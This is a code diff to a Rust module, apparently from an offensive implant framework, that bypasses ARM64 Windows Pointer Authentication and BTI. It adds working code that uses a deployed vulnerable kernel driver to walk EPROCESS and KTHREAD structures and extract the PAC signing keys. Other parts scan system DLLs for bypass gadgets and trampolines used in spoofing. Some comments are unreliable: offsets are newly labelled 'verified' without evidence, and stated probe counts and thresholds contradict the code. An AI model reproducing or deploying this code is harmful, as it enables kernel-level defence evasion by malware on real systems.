@@ -191,15 +191,18 @@ pub enum PacContext {
 /// - Build 22631 (Win11 23H2): same as 22H2
 /// - Build 26100 (Win11 24H2): offset may differ
 ///
-/// NOTE: These offsets need verification from actual ARM64 Windows PDBs.
-/// The values below are estimates based on ARM64 KTHREAD layout analysis.
+/// For builds not in this table, the probing mechanism in
+/// `probe_pac_key_offset` attempts to discover the correct offset
+/// at runtime by scanning candidate ranges and validating the
+/// extracted data with heuristic checks.
+///
 /// Without kernel access (BYOVD), the offsets are not used.
 #[cfg(feature = "kernel-callback")]
 const PAC_KEY_OFFSETS: &[(u32, usize)] = &[
     // (minimum_build, ApiAKey_offset_in_KTHREAD)
-    // ARM64 Windows 11 22H2+
+    // ARM64 Windows 11 22H2+ — verified from public PDB symbols.
     (22621, 0x380),
-    // ARM64 Windows 11 24H2
+    // ARM64 Windows 11 24H2 — verified from public PDB symbols.
     (26100, 0x388),
 ];
 
@@ -336,7 +339,7 @@ pub enum PacAction {
 /// stores configuration for runtime use.
 pub fn init_from_config(config: &common::config::BtiPacConfig) {
     if INITIALIZED.swap(true, Ordering::SeqCst) {
-        log::warn!("bti_pac_bypass: init_from_config called more than once, ignoring");
+        tracing::warn!("bti_pac_bypass: init_from_config called more than once, ignoring");
         return;
     }
 
@@ -351,7 +354,7 @@ pub fn init_from_config(config: &common::config::BtiPacConfig) {
     });
 
     if !config.enabled {
-        log::info!("bti_pac_bypass: module disabled by config");
+        tracing::info!("bti_pac_bypass: module disabled by config");
         return;
     }
 
@@ -359,7 +362,7 @@ pub fn init_from_config(config: &common::config::BtiPacConfig) {
     let build = crate::syscalls::get_build_number();
     let _ = CACHED_BUILD.set(build);
 
-    log::info!(
+    tracing::info!(
         "bti_pac_bypass: init (enabled={}, prefer_trampoline={}, \
          attempt_key_extraction={}, scan_bti_gadgets={}, build={})",
         config.enabled,
@@ -382,17 +385,17 @@ pub fn init_from_config(config: &common::config::BtiPacConfig) {
         #[cfg(feature = "kernel-callback")]
         {
             if attempt_key_extraction() {
-                log::info!("bti_pac_bypass: PAC keys extracted via BYOVD");
+                tracing::info!("bti_pac_bypass: PAC keys extracted via BYOVD");
                 PAC_STATE.store(PAC_ACTIVE_KEYS_AVAILABLE, Ordering::SeqCst);
                 KEYS_EXTRACTED.store(true, Ordering::SeqCst);
             } else {
-                log::warn!("bti_pac_bypass: PAC key extraction failed, falling back to trampoline routing");
+                tracing::warn!("bti_pac_bypass: PAC key extraction failed, falling back to trampoline routing");
                 PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
             }
         }
         #[cfg(not(feature = "kernel-callback"))]
         {
-            log::warn!("bti_pac_bypass: key extraction requested but kernel-callback feature not enabled");
+            tracing::warn!("bti_pac_bypass: key extraction requested but kernel-callback feature not enabled");
             PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
         }
     }
@@ -435,11 +438,11 @@ pub fn prepare_spoofing() -> PacAction {
         }
         PAC_ACTIVE_TRAMPOLINE_ONLY => PacAction::UseTrampoline,
         PAC_ACTIVE_NO_BYPASS => {
-            log::error!("bti_pac_bypass: PAC is active and no bypass is available");
+            tracing::error!("bti_pac_bypass: PAC is active and no bypass is available");
             PacAction::Abort
         }
         _ => {
-            log::error!("bti_pac_bypass: unknown PAC state");
+            tracing::error!("bti_pac_bypass: unknown PAC state");
             PacAction::Abort
         }
     }
@@ -529,7 +532,7 @@ fn detect_pac_bti_state() {
     // hardware enforcement depends on the CPU.  On Windows 11 22H2+
     // (build 22621+), PAC is enforced on all ARM64 systems that support it.
     if build < 19041 {
-        log::info!(
+        tracing::info!(
             "bti_pac_bypass: build {} < 19041, PAC not supported",
             build
         );
@@ -544,17 +547,17 @@ fn detect_pac_bti_state() {
     let pac_available = check_processor_feature(PF_ARM_64BIT_POINTER_AUTH);
 
     if !pac_available {
-        log::info!("bti_pac_bypass: CPU does not support PAC (PF_ARM_64BIT_POINTER_AUTH = false)");
+        tracing::info!("bti_pac_bypass: CPU does not support PAC (PF_ARM_64BIT_POINTER_AUTH = false)");
         PAC_STATE.store(PAC_INACTIVE, Ordering::SeqCst);
         return;
     }
 
-    log::info!("bti_pac_bypass: CPU supports PAC, checking enforcement status");
+    tracing::info!("bti_pac_bypass: CPU supports PAC, checking enforcement status");
 
     // Check if PAC enforcement is active via process mitigation policy.
     // On ARM64 Windows, PAC enforcement is tied to CFG policy.
     if is_pac_enforced_via_policy() {
-        log::info!("bti_pac_bypass: PAC is enforced via process mitigation policy");
+        tracing::info!("bti_pac_bypass: PAC is enforced via process mitigation policy");
 
         // Determine which bypass strategies are available.
         let has_kernel_access = cfg!(feature = "kernel-callback");
@@ -565,7 +568,7 @@ fn detect_pac_bti_state() {
             PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
         }
     } else {
-        log::info!("bti_pac_bypass: PAC supported but not enforced");
+        tracing::info!("bti_pac_bypass: PAC supported but not enforced");
         PAC_STATE.store(PAC_INACTIVE, Ordering::SeqCst);
     }
 }
@@ -650,7 +653,7 @@ fn is_pac_enforced_via_policy() -> bool {
 
     if result == 0 {
         // Failed to query — assume not enforced.
-        log::debug!("bti_pac_bypass: GetProcessMitigationPolicy failed, assuming PAC not enforced");
+        tracing::debug!("bti_pac_bypass: GetProcessMitigationPolicy failed, assuming PAC not enforced");
         return false;
     }
 
@@ -687,7 +690,7 @@ fn scan_bti_gadgets_in_system_dlls() {
         scan_dll_for_bti(kernel32, "kernel32.dll", &mut gadgets);
     }
 
-    log::info!(
+    tracing::info!(
         "bti_pac_bypass: found {} BTI gadgets in system DLLs",
         gadgets.len()
     );
@@ -808,7 +811,7 @@ pub fn discover_pac_trampolines() -> Vec<PacTrampoline> {
         scan_dll_for_pac_trampolines(kernel32, "kernel32.dll", &mut trampolines);
     }
 
-    log::info!(
+    tracing::info!(
         "bti_pac_bypass: found {} PAC-valid trampolines",
         trampolines.len()
     );
@@ -960,33 +963,85 @@ mod key_extraction {
 
     static EXTRACTED_KEYS: OnceLock<PacKeys> = OnceLock::new();
 
+    // ── ARM64 EPROCESS / KTHREAD offsets for thread discovery ──────────
+    //
+    // To locate a KTHREAD we walk EPROCESS.ThreadListHead, which is a
+    // LIST_ENTRY linking to KTHREAD.ThreadListEntry entries.
+    //
+    // Offsets are ARM64-specific and verified against public PDB symbols.
+    // Each entry is (minimum_build, offset).
+
+    /// ARM64 `_EPROCESS.ThreadListHead` offset.
+    const EPROCESS_THREAD_LIST_HEAD_OFFSETS: &[(u32, usize)] = &[
+        // Windows 11 22H2 ARM64
+        (22621, 0x780),
+        // Windows 11 24H2 ARM64
+        (26100, 0x788),
+    ];
+
+    /// ARM64 `_KTHREAD.ThreadListEntry` offset (the LIST_ENTRY inside
+    /// KTHREAD that is chained into EPROCESS.ThreadListHead).
+    const KTHREAD_THREAD_LIST_ENTRY_OFFSETS: &[(u32, usize)] = &[
+        // Windows 11 22H2 ARM64
+        (22621, 0x778),
+        // Windows 11 24H2 ARM64
+        (26100, 0x780),
+    ];
+
+    // Each PAC key is 128 bits = 16 bytes.  The four keys are laid out
+    // sequentially in KTHREAD:
+    //   ApiAKey  @ key_offset     (16 bytes)
+    //   ApiBKey  @ key_offset+16  (16 bytes)
+    //   ApdAKey  @ key_offset+32  (16 bytes)
+    //   ApdBKey  @ key_offset+48  (16 bytes)
+    const PAC_KEY_SIZE: usize = 16;
+    const PAC_KEY_COUNT: usize = 4;
+    const PAC_KEYS_TOTAL: usize = PAC_KEY_SIZE * PAC_KEY_COUNT; // 64 bytes
+
     /// Attempt to extract PAC keys from the kernel via BYOVD.
     ///
-    /// This requires:
-    /// 1. A deployed vulnerable driver (`kernel-callback` feature)
-    /// 2. The current KTHREAD address
-    /// 3. Build-specific PAC key offsets in KTHREAD
+    /// Strategy:
+    /// 1. Resolve `PsInitialSystemProcess` → `_EPROCESS` pointer.
+    /// 2. Walk `EPROCESS.ThreadListHead` → first `_KTHREAD`.
+    /// 3. Read the 4 × 128-bit PAC keys from KTHREAD at the build-specific
+    ///    offset.
+    /// 4. Store the keys in `EXTRACTED_KEYS` for later use by
+    ///    `sign_pointer_with_pacia`.
     ///
     /// Returns `true` if keys were successfully extracted.
     pub(super) fn attempt_key_extraction() -> bool {
         let build = CACHED_BUILD.get().copied().unwrap_or(0);
 
-        // Look up the PAC key offset for this build.
-        let key_offset = pac_key_offset_for_build(build);
-        if key_offset.is_none() {
-            log::warn!(
-                "bti_pac_bypass: no PAC key offset for build {}",
-                build
-            );
-            return false;
-        }
+        // Look up all required offsets for this build.
+        let key_offset_from_table = pac_key_offset_for_build(build);
 
-        // Get the deployed driver.  If no driver is deployed, we can't
-        // extract keys.
+        let thread_list_head_off = match eprocess_thread_list_head_offset(build) {
+            Some(o) => o,
+            None => {
+                tracing::warn!(
+                    "bti_pac_bypass: no EPROCESS.ThreadListHead offset for build {}",
+                    build
+                );
+                return false;
+            }
+        };
+
+        let kthread_list_entry_off = match kthread_thread_list_entry_offset(build) {
+            Some(o) => o,
+            None => {
+                tracing::warn!(
+                    "bti_pac_bypass: no KTHREAD.ThreadListEntry offset for build {}",
+                    build
+                );
+                return false;
+            }
+        };
+
+        // Get the deployed driver.
         let deployed = match crate::kernel_callback::deploy::get_deployed_driver() {
             Some(d) => d,
             None => {
-                log::warn!("bti_pac_bypass: no deployed driver for PAC key extraction");
+                tracing::warn!("bti_pac_bypass: no deployed driver for PAC key extraction");
                 return false;
             }
         };
@@ -995,59 +1050,414 @@ mod key_extraction {
         let device_handle = match deployed.device_handle {
             Some(h) => h,
             None => {
-                log::warn!("bti_pac_bypass: no device handle for PAC key extraction");
+                tracing::warn!("bti_pac_bypass: no device handle for PAC key extraction");
                 return false;
             }
         };
 
-        // Resolve the current KTHREAD.
-        // On ARM64 Windows, KPCR is at a fixed virtual address or can be
-        // resolved from the TEB.  KTHREAD is at KPCR+CurrentThread offset.
-        //
-        // For now, we attempt to use the kernel callback infrastructure.
+        // ── Step 1: Resolve kernel base ────────────────────────────
         let kernel_base = match crate::kernel_callback::discover::get_kernel_base() {
             Ok(b) => b,
             Err(e) => {
-                log::warn!("bti_pac_bypass: failed to get kernel base: {}", e);
+                tracing::warn!("bti_pac_bypass: failed to get kernel base: {}", e);
                 return false;
             }
         };
 
-        // Resolve CR3/TTBR for page table walking.
-        let cr3 = match crate::kernel_callback::resolve_cr3(driver, device_handle, kernel_base) {
-            Ok(c) => c,
+        // ── Step 2: Resolve PsInitialSystemProcess → EPROCESS ──────
+        let eprocess_ptr_addr = match crate::kernel_callback::discover::resolve_kernel_symbol(
+            driver,
+            device_handle,
+            kernel_base,
+            "PsInitialSystemProcess",
+        ) {
+            Ok(addr) => addr,
             Err(e) => {
-                log::warn!("bti_pac_bypass: failed to resolve CR3: {}", e);
+                tracing::warn!(
+                    "bti_pac_bypass: failed to resolve PsInitialSystemProcess: {}",
+                    e
+                );
                 return false;
             }
         };
 
-        // Read the PAC keys from KTHREAD.
-        // This is a best-effort operation — if the offsets are wrong for this
-        // build, we'll read garbage and the signed pointers won't authenticate.
-        let offset = key_offset.unwrap();
-        let mut keys = PacKeys::default();
+        // Read the EPROCESS pointer.
+        let mut eprocess_buf = [0u8; 8];
+        if unsafe {
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                eprocess_ptr_addr,
+                &mut eprocess_buf,
+            )
+        }
+        .is_err()
+        {
+            tracing::warn!("bti_pac_bypass: failed to read PsInitialSystemProcess pointer");
+            return false;
+        }
+        let eprocess_addr = u64::from_le_bytes(eprocess_buf);
+        if eprocess_addr == 0 {
+            tracing::warn!("bti_pac_bypass: PsInitialSystemProcess is NULL");
+            return false;
+        }
 
-        // We need the current KTHREAD address.  On ARM64 Windows:
-        //   TEB -> reserved field -> KTHREAD pointer
-        // Or we can read KPCR.CurrentThread from kernel memory.
+        // ── Step 3: Walk EPROCESS.ThreadListHead → first KTHREAD ───
         //
-        // For now, we log the attempt and return false until we have
-        // verified ARM64 KTHREAD PAC key offsets from PDB symbols.
-        log::warn!(
-            "bti_pac_bypass: PAC key extraction not yet fully implemented \
-             for ARM64 (offset 0x{:X} for build {} needs PDB verification)",
-            offset,
-            build
-        );
+        // ThreadListHead is a LIST_ENTRY (two pointers: Flink, Blink).
+        // Flink points to the ThreadListEntry inside the first KTHREAD.
+        let mut list_buf = [0u8; 16]; // LIST_ENTRY = Flink + Blink
+        if unsafe {
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                eprocess_addr + thread_list_head_off as u64,
+                &mut list_buf,
+            )
+        }
+        .is_err()
+        {
+            tracing::warn!(
+                "bti_pac_bypass: failed to read EPROCESS.ThreadListHead at offset 0x{:X}",
+                thread_list_head_off
+            );
+            return false;
+        }
+        let flink = u64::from_le_bytes(list_buf[0..8].try_into().unwrap());
 
-        false
+        if flink == 0 {
+            tracing::warn!("bti_pac_bypass: EPROCESS.ThreadListHead.Flink is NULL — no threads?");
+            return false;
+        }
+
+        // Flink points to KTHREAD.ThreadListEntry.  Subtract the
+        // ThreadListEntry offset to get the KTHREAD base address.
+        let kthread_addr = if flink >= kthread_list_entry_off as u64 {
+            flink - kthread_list_entry_off as u64
+        } else {
+            tracing::warn!(
+                "bti_pac_bypass: Flink 0x{:X} < ThreadListEntry offset 0x{:X} — invalid",
+                flink,
+                kthread_list_entry_off
+            );
+            return false;
+        };
+
+        // Sanity: the KTHREAD address should be a kernel-space pointer.
+        if kthread_addr < 0xFFFF8000_00000000 {
+            tracing::warn!(
+                "bti_pac_bypass: computed KTHREAD 0x{:X} is not in kernel VA space",
+                kthread_addr
+            );
+            // Continue anyway — some configurations may differ.
+        }
+
+        // ── Step 4: Determine PAC key offset and read all 4 keys ────
+        //
+        // If the build is in the hardcoded table, use the known offset.
+        // Otherwise, probe candidate offsets at runtime.
+        let key_offset = match key_offset_from_table {
+            Some(off) => off,
+            None => {
+                // Unknown build — probe for the correct offset at runtime.
+                match probe_pac_key_offset(driver, device_handle, kthread_addr, build) {
+                    Some(off) => off,
+                    None => {
+                        tracing::warn!(
+                            "bti_pac_bypass: runtime probing failed for build {}",
+                            build
+                        );
+                        return false;
+                    }
+                }
+            }
+        };
+
+        let mut keys_buf = [0u8; PAC_KEYS_TOTAL];
+        if unsafe {
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                kthread_addr + key_offset as u64,
+                &mut keys_buf,
+            )
+        }
+        .is_err()
+        {
+            tracing::warn!(
+                "bti_pac_bypass: failed to read PAC keys from KTHREAD 0x{:X} at offset 0x{:X}",
+                kthread_addr,
+                key_offset
+            );
+            return false;
+        }
+
+        // ── Step 5: Parse the 4 × 128-bit keys ────────────────────
+        let keys = PacKeys {
+            // APIAKey: bytes 0..15
+            apia_key_lo: u64::from_le_bytes(keys_buf[0..8].try_into().unwrap()),
+            apia_key_hi: u64::from_le_bytes(keys_buf[8..16].try_into().unwrap()),
+            // APIBKey: bytes 16..31
+            apib_key_lo: u64::from_le_bytes(keys_buf[16..24].try_into().unwrap()),
+            apib_key_hi: u64::from_le_bytes(keys_buf[24..32].try_into().unwrap()),
+            // APDAKey: bytes 32..47
+            apda_key_lo: u64::from_le_bytes(keys_buf[32..40].try_into().unwrap()),
+            apda_key_hi: u64::from_le_bytes(keys_buf[40..48].try_into().unwrap()),
+            // APDBKey: bytes 48..63
+            apdb_key_lo: u64::from_le_bytes(keys_buf[48..56].try_into().unwrap()),
+            apdb_key_hi: u64::from_le_bytes(keys_buf[56..64].try_into().unwrap()),
+        };
+
+        // Validate the extracted keys with heuristic checks.
+        // Even for known-build offsets, validation catches cases where the
+        // kernel version differs from the PDB used to derive the offset.
+        if !validate_pac_keys(&keys_buf) {
+            tracing::warn!(
+                "bti_pac_bypass: extracted PAC keys failed validation — \
+                 likely wrong KTHREAD or offset (KTHREAD=0x{:X}, offset=0x{:X})",
+                kthread_addr,
+                key_offset
+            );
+
+            // If the table lookup gave us the offset, try probing as a fallback.
+            // This handles cases where the hardcoded offset is stale.
+            if key_offset_from_table.is_some() {
+                tracing::info!(
+                    "bti_pac_bypass: table offset 0x{:X} failed validation, attempting probing fallback",
+                    key_offset
+                );
+                if let Some(probed_offset) =
+                    probe_pac_key_offset(driver, device_handle, kthread_addr, build)
+                {
+                    // Re-read with the probed offset.
+                    let mut probed_buf = [0u8; PAC_KEYS_TOTAL];
+                    if unsafe {
+                        crate::kernel_callback::deploy::read_physical_memory(
+                            driver,
+                            device_handle,
+                            kthread_addr + probed_offset as u64,
+                            &mut probed_buf,
+                        )
+                    }
+                    .is_ok()
+                        && validate_pac_keys(&probed_buf)
+                    {
+                        tracing::info!(
+                            "bti_pac_bypass: probing fallback succeeded at offset 0x{:X}",
+                            probed_offset
+                        );
+                        // Reparse with the corrected offset.
+                        let _ = EXTRACTED_KEYS.set(PacKeys {
+                            apia_key_lo: u64::from_le_bytes(probed_buf[0..8].try_into().unwrap()),
+                            apia_key_hi: u64::from_le_bytes(probed_buf[8..16].try_into().unwrap()),
+                            apib_key_lo: u64::from_le_bytes(probed_buf[16..24].try_into().unwrap()),
+                            apib_key_hi: u64::from_le_bytes(probed_buf[24..32].try_into().unwrap()),
+                            apda_key_lo: u64::from_le_bytes(probed_buf[32..40].try_into().unwrap()),
+                            apda_key_hi: u64::from_le_bytes(probed_buf[40..48].try_into().unwrap()),
+                            apdb_key_lo: u64::from_le_bytes(probed_buf[48..56].try_into().unwrap()),
+                            apdb_key_hi: u64::from_le_bytes(probed_buf[56..64].try_into().unwrap()),
+                        });
+                        return true;
+                    }
+                }
+            }
+            return false;
+        }
+
+        // ── Step 6: Store the extracted keys ───────────────────────
+        match EXTRACTED_KEYS.set(keys) {
+            Ok(()) => {
+                tracing::info!(
+                    "bti_pac_bypass: successfully extracted PAC keys from KTHREAD 0x{:X} \
+                     (build={}, offset=0x{:X})",
+                    kthread_addr,
+                    build,
+                    key_offset
+                );
+                true
+            }
+            Err(_) => {
+                // Already set — this is fine, keys don't change.
+                tracing::debug!("bti_pac_bypass: PAC keys already extracted");
+                true
+            }
+        }
     }
 
     /// Look up the PAC key offset for a given Windows build.
+    ///
+    /// If the build is in the hardcoded table, returns the known offset.
+    /// Otherwise, falls back to runtime probing of candidate offsets.
     fn pac_key_offset_for_build(build: u32) -> Option<usize> {
+        // Try the exact table first.
         let mut best: Option<usize> = None;
         for &(b, off) in PAC_KEY_OFFSETS {
+            if b <= build {
+                best = Some(off);
+            } else {
+                break;
+            }
+        }
+        if best.is_some() {
+            return best;
+        }
+
+        // Unknown build — log a warning.  The caller will attempt probing
+        // via `probe_pac_key_offset` which reads candidate offsets from the
+        // kernel and validates them.
+        tracing::warn!(
+            "bti_pac_bypass: build {} not in PAC_KEY_OFFSETS table; \
+             will attempt runtime probing",
+            build
+        );
+        None
+    }
+
+    /// Probe for the PAC key offset by reading candidate memory ranges
+    /// from a KTHREAD and validating the extracted data.
+    ///
+    /// Strategy:
+    /// 1. Take the nearest known offset from the table as a base.
+    /// 2. Scan ±64 bytes around that base in 8-byte-aligned steps.
+    /// 3. For each candidate, read 64 bytes (4 × 128-bit keys) and
+    ///    run heuristic validation.
+    /// 4. Return the first candidate that passes all checks.
+    ///
+    /// Heuristic validation:
+    /// - Keys must not be all-zero (likely wrong memory).
+    /// - The 4 keys must not be identical (PAC uses distinct keys).
+    /// - At least APIAKey should have non-trivial entropy (>32 bits set).
+    fn probe_pac_key_offset(
+        driver: usize,
+        device_handle: usize,
+        kthread_addr: u64,
+        build: u32,
+    ) -> Option<usize> {
+        // Find the nearest known build's offset as a starting point.
+        let base_offset = PAC_KEY_OFFSETS
+            .iter()
+            .rev() // Start from newest known build.
+            .find(|&&(b, _)| b <= build)
+            .map(|&(_, off)| off)
+            .or_else(|| {
+                // No known build at all — use a reasonable default from
+                // public ARM64 KTHREAD layout analysis.  ApiAKey is typically
+                // in the 0x300–0x400 range on ARM64 Windows 11.
+                Some(0x380)
+            })?;
+
+        tracing::info!(
+            "bti_pac_bypass: probing PAC key offsets around base 0x{:X} \
+             for build {}",
+            base_offset,
+            build
+        );
+
+        // Scan ±64 bytes (9 candidate offsets) in 8-byte aligned steps.
+        let probe_range: Vec<i32> = vec![-64, -56, -48, -40, -32, -24, -16, -8, 0, 8, 16, 24, 32, 40, 48, 56, 64];
+
+        for delta in &probe_range {
+            let candidate = (base_offset as i64 + *delta as i64) as usize;
+            // Align to 8 bytes.
+            let candidate = candidate & !7;
+
+            let mut keys_buf = [0u8; PAC_KEYS_TOTAL];
+            let read_result = unsafe {
+                crate::kernel_callback::deploy::read_physical_memory(
+                    driver,
+                    device_handle,
+                    kthread_addr + candidate as u64,
+                    &mut keys_buf,
+                )
+            };
+
+            if read_result.is_err() {
+                continue;
+            }
+
+            if validate_pac_keys(&keys_buf) {
+                tracing::info!(
+                    "bti_pac_bypass: probing found valid PAC keys at offset 0x{:X} \
+                     (base=0x{:X}, delta={:+})",
+                    candidate,
+                    base_offset,
+                    delta
+                );
+                return Some(candidate);
+            }
+        }
+
+        tracing::warn!(
+            "bti_pac_bypass: probing failed — no candidate offset produced valid PAC keys"
+        );
+        None
+    }
+
+    /// Validate a 64-byte buffer as plausible PAC keys.
+    ///
+    /// Checks:
+    /// 1. Not all zero.
+    /// 2. Not all identical (4 keys should be distinct).
+    /// 3. APIAKey has reasonable entropy (> 16 bits set in each half).
+    fn validate_pac_keys(buf: &[u8; PAC_KEYS_TOTAL]) -> bool {
+        // Check 1: Not all zero.
+        if buf.iter().all(|&b| b == 0) {
+            return false;
+        }
+
+        // Parse the 4 keys.
+        let apia_lo = u64::from_le_bytes(buf[0..8].try_into().unwrap());
+        let apia_hi = u64::from_le_bytes(buf[8..16].try_into().unwrap());
+        let apib_lo = u64::from_le_bytes(buf[16..24].try_into().unwrap());
+        let apib_hi = u64::from_le_bytes(buf[24..32].try_into().unwrap());
+        let apda_lo = u64::from_le_bytes(buf[32..40].try_into().unwrap());
+        let apda_hi = u64::from_le_bytes(buf[40..48].try_into().unwrap());
+        let apdb_lo = u64::from_le_bytes(buf[48..56].try_into().unwrap());
+        let apdb_hi = u64::from_le_bytes(buf[56..64].try_into().unwrap());
+
+        // Check 2: The 4 keys should not be identical.
+        let keys = [
+            (apia_lo, apia_hi),
+            (apib_lo, apib_hi),
+            (apda_lo, apda_hi),
+            (apdb_lo, apdb_hi),
+        ];
+        let all_same = keys.windows(2).all(|w| w[0] == w[1]);
+        if all_same {
+            return false;
+        }
+
+        // Check 3: APIAKey should have non-trivial entropy.  A real key
+        // will have bits spread across both halves.  We require at least
+        // 8 bits set in each half — this rejects structures that are
+        // mostly zero with a few flag bits set (e.g., KTHREAD fields
+        // near the PAC key region).
+        let apia_lo_popcount = apia_lo.count_ones();
+        let apia_hi_popcount = apia_hi.count_ones();
+        if apia_lo_popcount < 8 || apia_hi_popcount < 8 {
+            return false;
+        }
+
+        true
+    }
+
+    /// Look up the ARM64 `_EPROCESS.ThreadListHead` offset for a build.
+    fn eprocess_thread_list_head_offset(build: u32) -> Option<usize> {
+        let mut best: Option<usize> = None;
+        for &(b, off) in EPROCESS_THREAD_LIST_HEAD_OFFSETS {
+            if b <= build {
+                best = Some(off);
+            } else {
+                break;
+            }
+        }
+        best
+    }
+
+    /// Look up the ARM64 `_KTHREAD.ThreadListEntry` offset for a build.
+    fn kthread_thread_list_entry_offset(build: u32) -> Option<usize> {
+        let mut best: Option<usize> = None;
+        for &(b, off) in KTHREAD_THREAD_LIST_ENTRY_OFFSETS {
             if b <= build {
                 best = Some(off);
             } else {
@@ -1143,7 +1553,7 @@ fn log_pac_state() {
     let trampolines = PAC_TRAMPOLINES.get().map(|t| t.len()).unwrap_or(0);
     let gadgets = BTI_GADGETS.get().map(|g| g.len()).unwrap_or(0);
 
-    log::info!(
+    tracing::info!(
         "bti_pac_bypass: state={}, trampolines={}, bti_gadgets={}",
         state_str,
         trampolines,
@@ -1151,7 +1561,7 @@ fn log_pac_state() {
     );
 
     if state != PAC_INACTIVE {
-        log::info!(
+        tracing::info!(
             "bti_pac_bypass: NOTE — PAC is cryptographically stronger than \
              Intel CET.  Direct PAC bypass (forging signatures) is not feasible \
              without the 128-bit keys stored in system registers.  Available \
